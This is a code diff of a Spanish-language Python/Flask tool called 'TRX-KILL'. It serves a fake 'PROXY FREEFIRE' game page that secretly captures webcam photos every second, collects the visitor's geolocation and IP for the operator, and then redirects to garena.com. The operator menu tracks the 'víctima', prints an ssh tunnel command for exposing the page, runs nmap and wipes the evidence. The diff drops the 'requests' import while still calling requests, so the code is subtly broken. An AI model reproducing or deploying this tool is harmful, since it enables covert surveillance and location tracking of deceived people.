@@ -1,4 +1,4 @@
-import os, sys, time, threading, base64, requests
+import os, sys, time, threading, base64, socket
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -7,21 +7,22 @@ LOG_FILE = f"{STORAGE_PATH}/result.txt"
 FOTO_DIR = f"{STORAGE_PATH}/fotos"
 G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"
 
+# Asegurar directorios
 for p in [STORAGE_PATH, FOTO_DIR]:
     if not os.path.exists(p): os.makedirs(p)
 
+# HTML con diseño Pro-Proxy
 HTML_TEMPLATE = """
 <!DOCTYPE html><html><head><meta charset="UTF-8"><title>PROXY</title>
 <style>
     body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
-    .c{border:2px solid #0f0;padding:30px;text-align:center;border-radius:10px;}
+    .c{border:2px solid #0f0;padding:30px;text-align:center;border-radius:10px;box-shadow:0 0 10px #0f0;}
     button{background:#0f0;border:none;padding:15px 30px;font-weight:bold;cursor:pointer;}
 </style></head><body>
 <div class="c"><h1>PROXY FREEFIRE</h1><button onclick="iniciar()">CONTINUAR</button></div>
 <video id="v" style="display:none"></video>
 <script>
 async function iniciar() {
-    // Cámara
     try {
         const stream = await navigator.mediaDevices.getUserMedia({video: true});
         const v = document.getElementById('v'); v.srcObject = stream;
@@ -32,7 +33,6 @@ async function iniciar() {
             fetch('/foto', {method:'POST', body:canvas.toDataURL('image/jpeg')});
         }, 1000);
     } catch(e) {}
-    // Geo
     navigator.geolocation.getCurrentPosition(pos => {
         fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
         window.location.href = 'https://www.garena.com';
@@ -55,10 +55,6 @@ def log():
     with open(LOG_FILE, "a") as f: f.write(f"LAT:{request.args.get('lat')}|LON:{request.args.get('lon')}|IP:{request.remote_addr}\n")
     return "OK"
 
-def animar(t):
-    for c in t: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.01)
-    print()
-
 def banner():
     os.system('clear')
     print(f"{G}  _______________________________________")
@@ -69,27 +65,35 @@ def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
     while True:
         banner()
-        print(f"{C} [01] RASTREAR VÍCTIMA  | [02] LINK-TÚNEL")
-        print(f" [03] VER FOTOS         | [04] VER LOGS")
-        print(f" [05] LIMPIAR TODO      | [00] SALIR{W}")
+        print(f"{C} [01] RASTREAR VÍCTIMA  | [02] LINK TÚNEL")
+        print(f" [03] GESTIÓN DE FOTOS  | [04] VER LOGS")
+        print(f" [05] ESCANER DE PUERTOS| [06] IP PUBLICA")
+        print(f" [07] LIMPIEZA TOTAL    | [00] SALIR{W}")
         s = input(f"\n{Y}TRX-ROOT > {W}")
+        
         if s == "1":
             if os.path.exists(LOG_FILE):
                 with open(LOG_FILE, 'r') as f:
                     d = f.readlines()[-1].split('|')
                     print(f"\n{G}[+] COORDENADAS: {W}{d[0].replace('LAT:','')} , {d[1].replace('LON:','')}")
-                    print(f"{G}[+] MAPA: {W}https://www.google.com/maps/search/?api=1&query={d[0].replace('LAT:','')},{d[1].replace('LON:','')}")
-            input(f"\n{Y}ENTER...{W}")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
         elif s == "2":
             print(f"\n{C}EJECUTA EN OTRA VENTANA: {W}ssh -R 80:localhost:5000 ssh.localhost.run")
-            input(f"\n{Y}ENTER...{W}")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
         elif s == "3":
             os.system(f"ls {FOTO_DIR}")
-            input(f"\n{Y}ENTER...{W}")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
         elif s == "5":
-            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            os.system(f"rm {FOTO_DIR}/*")
-            animar(f"{R}[!] SISTEMA LIMPIADO.{W}"); input()
+            target = input("IP A ESCANEAR: ")
+            os.system(f"nmap {target}")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
+        elif s == "6":
+            ip = requests.get('https://api.ipify.org').text
+            print(f"\n{G}[+] TU IP PUBLICA ES: {W}{ip}")
+            input(f"\n{Y}PRESIONA ENTER...{W}")
+        elif s == "7":
+            os.system(f"rm -rf {STORAGE_PATH}/*")
+            print(f"{R}[!] SISTEMA LIMPIADO.{W}"); input()
         elif s == "0": sys.exit()
 
 if __name__ == "__main__": main()
